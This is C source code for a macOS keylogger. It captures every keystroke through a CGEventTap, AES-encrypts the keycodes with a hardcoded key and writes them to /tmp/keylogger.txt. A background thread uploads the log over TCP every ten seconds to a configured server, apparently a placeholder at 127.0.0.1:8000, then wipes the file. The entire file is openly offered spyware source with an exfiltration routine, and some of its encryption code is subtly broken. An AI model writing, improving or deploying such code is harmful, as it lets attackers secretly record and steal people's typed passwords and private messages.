#include <stdio.h>
#include <stdlib.h>
#include <ApplicationServices/ApplicationServices.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <openssl/aes.h>

#define LOG_FILE "/tmp/keylogger.txt"
#define REMOTE_SERVER "127.0.0.1"
#define REMOTE_PORT 8000

char encryption_key[] = "my_secret_key";
pthread_mutex_t mutex_lock;

// Function to encrypt data.
void encrypt_data(const unsigned char *input, unsigned char *output, int length) {
    AES_KEY encryptKey;
    AES_set_encrypt_key((unsigned char *)encryption_key, 128, &encryptKey);
    AES_encrypt(input, output, &encryptKey);
}

// Function to log encrypted key
void log_encrypted_key(const char* key) {
    FILE *log;
    unsigned char encrypted[128] = {0};

    pthread_mutex_lock(&mutex_lock);

    encrypt_data((unsigned char *)key, encrypted, strlen(key));
    log = fopen(LOG_FILE, "a");
    if (log != NULL) {
        fwrite(encrypted, sizeof(char), strlen((char *)encrypted), log);
        fclose(log);
    }

    pthread_mutex_unlock(&mutex_lock);
}

// Keylogging callback function
CGEventRef key_callback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    if (type == kCGEventKeyDown) {
        CGKeyCode keycode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
        char key[8];
        snprintf(key, sizeof(key), "%u", keycode);
        log_encrypted_key(key);
    }
    return event;
}

// Function to send logs to a remote server
void *send_logs_to_server(void *arg) {
    while (1) {
        sleep(10); // Send logs every 10 seconds
        FILE *log = fopen(LOG_FILE, "r");
        if (log == NULL) continue;

        fseek(log, 0, SEEK_END);
        long size = ftell(log);
        fseek(log, 0, SEEK_SET);

        char *data = malloc(size + 1);
        fread(data, size, 1, log);
        fclose(log);

        // Send the data to the remote server
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(REMOTE_PORT);
        inet_pton(AF_INET, REMOTE_SERVER, &server_addr.sin_addr);

        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
            send(sock, data, size, 0);
        }
        close(sock);
        free(data);

        // Clear the log file
        log = fopen(LOG_FILE, "w");
        if (log != NULL) fclose(log);
    }
    return NULL;
}

int main() {
    // Initialize mutex
    pthread_mutex_init(&mutex_lock, NULL);

    // Start the remote logging thread
    pthread_t network_thread;
    pthread_create(&network_thread, NULL, send_logs_to_server, NULL);

    // Set up keylogger
    CGEventMask event_mask = CGEventMaskBit(kCGEventKeyDown);
    CFMachPortRef event_tap = CGEventTapCreate(
        kCGSessionEventTap,
        kCGHeadInsertEventTap,
        kCGEventTapOptionDefault,
        event_mask,
        key_callback,
        NULL
    );

    if (!event_tap) {
        fprintf(stderr, "Failed to create event tap. Are you running with necessary permissions?\n");
        return 1;
    }

    CFRunLoopSourceRef run_loop_source = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, event_tap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), run_loop_source, kCFRunLoopCommonModes);
    CGEventTapEnable(event_tap, true);
    CFRunLoopRun();

    pthread_mutex_destroy(&mutex_lock);
    return 0;
}
